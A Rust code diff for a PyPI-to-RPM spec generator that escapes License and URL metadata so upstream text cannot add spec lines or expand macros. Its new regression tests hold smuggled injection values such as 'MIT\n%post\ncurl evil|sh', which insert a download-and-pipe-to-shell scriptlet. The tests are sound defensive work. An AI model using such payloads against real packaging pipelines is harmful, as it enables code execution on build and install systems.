@@ -1419,18 +1419,21 @@ fn post_process(
         }
 
         // Fix License.
+        // Both values come from PyPI metadata: `rpm_text` keeps them on one line
+        // and doubles `%`, so upstream text cannot open a new spec line or expand
+        // a macro. The default URL is a deliberate macro and is not escaped.
         if line.starts_with("License:") {
-            let license = license_tag(&release.license);
+            let license = rpm_text(&license_tag(&release.license));
             out.push_str(&format!("License:        {license}\n"));
             continue;
         }
 
         // Fix URL.
         if line.starts_with("URL:") {
-            let url = release
-                .homepage
-                .as_deref()
-                .unwrap_or("https://pypi.org/project/%{name}");
+            let url = match release.homepage.as_deref() {
+                Some(homepage) => rpm_text(homepage),
+                None => "https://pypi.org/project/%{name}".to_string(),
+            };
             out.push_str(&format!("URL:            {url}\n"));
             continue;
         }
@@ -2264,9 +2267,11 @@ pub fn monorepo_skeleton(
             .and_then(|r| r.summary.as_deref())
             .unwrap_or("FIXME: add package summary"),
     );
-    let license = release
-        .map(|r| license_tag(&r.license))
-        .unwrap_or_else(|| "FIXME".to_string());
+    let license = rpm_text(
+        &release
+            .map(|r| license_tag(&r.license))
+            .unwrap_or_else(|| "FIXME".to_string()),
+    );
     let url = rpm_text(
         release
             .and_then(|r| r.homepage.as_deref())
@@ -2972,6 +2977,8 @@ pub fn wheel_binary_skeleton_shared(
         Some(l) => with_license_terms(license, &wheel_vendor_license_terms(l)),
         None => license,
     };
+    // A licence is rpm text too: its `%` is doubled and it stays on one line.
+    let license_text = rpm_text(&license);
     let description = wheel_description(layout.and_then(|l| l.description.as_deref()), summary);
     let url = rpm_text(release.homepage.as_deref().unwrap_or("FIXME"));
     // Two independent facts about a wheel:
@@ -3128,7 +3135,7 @@ pub fn wheel_binary_skeleton_shared(
          Version:        {version}\n\
          Release:        0\n\
          Summary:        {summary_tag}\n\
-         License:        {license}\n\
+         License:        {license_text}\n\
          URL:            {url}\n\
          Source0:        {wheel_filename}\n\
          {source99_line}\
@@ -3169,7 +3176,7 @@ pub fn wheel_binary_skeleton_shared(
         version = version,
         summary_tag = summary_tag,
         description = description,
-        license = license,
+        license_text = license_text,
         url = url,
         wheel_filename = wheel_filename,
         arch_line = arch_line,
@@ -8641,5 +8648,120 @@ mod wheel_generator_tests {
         // `%python_subpackages` does not add it: rpmlint's no-dependency-on python-base.
         let spec = skeleton(&WheelLayout::default(), License::Spdx("MIT".into()));
         assert!(spec.contains("\nRequires:       python-base\n"), "{spec}");
+    }
+}
+
+#[cfg(test)]
+mod license_url_injection_tests {
+    use super::*;
+
+    fn release(license: ap_ecosystem::pypi::License, homepage: Option<&str>) -> ap_ecosystem::pypi::Release {
+        ap_ecosystem::pypi::Release {
+            name: "pkg".to_string(),
+            version: "1.0".to_string(),
+            summary: Some("A package".to_string()),
+            homepage: homepage.map(str::to_string),
+            license,
+            requires_python: None,
+            requires_dist: Vec::new(),
+            yanked: false,
+            sdist: ap_ecosystem::pypi::Sdist {
+                filename: String::new(),
+                url: String::new(),
+                sha256: String::new(),
+                size: 0,
+            },
+        }
+    }
+
+    fn sdist_spec(release: &ap_ecosystem::pypi::Release) -> String {
+        let build_system = BuildSystem {
+            requires: vec![],
+            backend: None,
+        };
+        post_process_with_sdist(
+            "Name: pkg\nVersion: 1.0\nLicense: old\nURL: old\n%changelog\n",
+            release,
+            &build_system,
+            SdistFacts {
+                has_tests: false,
+                has_c_extensions: false,
+                top_level_tests_dir: None,
+                install_entries: None,
+                console_scripts: Vec::new(),
+            },
+        )
+    }
+
+    fn no_injected_line(spec: &str) {
+        assert!(
+            !spec.lines().any(|l| l.starts_with("%post") || l.starts_with("curl")),
+            "{spec}"
+        );
+    }
+
+    #[test]
+    fn license_newline_cannot_inject_a_scriptlet() {
+        let r = release(
+            ap_ecosystem::pypi::License::FreeText("MIT\n%post\ncurl evil|sh".to_string()),
+            Some("https://example.org"),
+        );
+        let spec = sdist_spec(&r);
+        no_injected_line(&spec);
+        assert!(
+            spec.contains("License:        MIT %%post curl evil|sh\n"),
+            "{spec}"
+        );
+    }
+
+    #[test]
+    fn homepage_newline_cannot_inject_a_scriptlet() {
+        let r = release(
+            ap_ecosystem::pypi::License::Spdx("MIT".to_string()),
+            Some("https://example.org\n%post\ncurl evil|sh"),
+        );
+        let spec = sdist_spec(&r);
+        no_injected_line(&spec);
+        assert!(
+            spec.contains("URL:            https://example.org %%post curl evil|sh\n"),
+            "{spec}"
+        );
+    }
+
+    #[test]
+    fn spdx_expression_and_default_url_are_unchanged() {
+        let r = release(
+            ap_ecosystem::pypi::License::Spdx("MIT OR Apache-2.0".to_string()),
+            None,
+        );
+        let spec = sdist_spec(&r);
+        assert!(spec.contains("License:        MIT OR Apache-2.0\n"), "{spec}");
+        assert!(
+            spec.contains("URL:            https://pypi.org/project/%{name}\n"),
+            "{spec}"
+        );
+    }
+
+    #[test]
+    fn monorepo_skeleton_license_is_one_line_and_escaped() {
+        let r = release(
+            ap_ecosystem::pypi::License::FreeText("MIT\n%post\ncurl evil|sh".to_string()),
+            Some("https://example.org"),
+        );
+        let spec = monorepo_skeleton("pkg", "1.0", &[], Some(&r));
+        no_injected_line(&spec);
+        assert!(spec.contains("License:        MIT %%post curl evil|sh\n"), "{spec}");
+    }
+
+    #[test]
+    fn wheel_skeleton_license_percent_is_doubled() {
+        let r = release(
+            ap_ecosystem::pypi::License::FreeText("GPL %post".to_string()),
+            Some("https://example.org/%x"),
+        );
+        let spec = wheel_binary_skeleton_shared("pkg", "1.0", "pkg-1.0-py3-none-any.whl", &r, None, None, &[]);
+        assert!(spec.contains("License:        GPL %%post\n"), "{spec}");
+        assert!(spec.contains("URL:            https://example.org/%%x\n"), "{spec}");
+        no_injected_line(&spec);
     }
 }
